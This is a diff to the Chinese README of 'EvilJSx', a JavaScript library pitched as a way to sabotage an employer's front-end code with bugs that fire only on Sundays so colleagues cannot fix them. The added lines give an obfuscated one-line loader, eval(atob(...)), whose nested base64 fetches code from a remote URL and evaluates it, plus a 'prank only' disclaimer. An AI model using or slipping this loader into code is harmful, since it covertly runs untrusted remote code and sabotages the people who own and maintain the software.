@@ -5,3 +5,13 @@ EvilJSx————更好用，更狠毒，更难发现！让黑心老板接受B
 1. 所有BUG只在周日生效，彻底避免同事修复BUG的可能！
 
 注意：目前不适用于nodejs，只适用于前端
+## 引入方法
+核心引入Boot：
+```
+eval(atob("KCgpPT57dm9pZCgwKTtldmFsKCcoKCk9PntmZXRjaChldmFsKGF0b2IoIkltaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5amJ5SSIrYXRvYigiY2xkNVNtMVpWMnh6U1dsM2FVbHNNV0pOVmpCeVNXMDFNR0ZZVm5WaFdGSTFUREoiK1siIisiIiwiM2FVbHNNV0oiXVswXSsiV01tRlhkM1JoYmsxMlkyMVdiV041T1c5YVYwWnJTV2wwYUdSSE9RPT0iKSsiaUtDSmplVGwwV1Zkc2RVd3lUblppV0VKd1lrZFdhMHh0Y0hvaUtRPT0iKSkpLnRoZW4oKGUpPT57cmV0dXJuIGUudGV4dCgpfSkudGhlbigodHh0KT0+e2V2YWwodHh0KX0pfSkoKScpfSkoKQ=="))
+```
+至于怎么用，不用我多说了吧
+
+## 免责声明
+
+本程序仅供整蛊娱乐，禁止在实际业务应用中引入
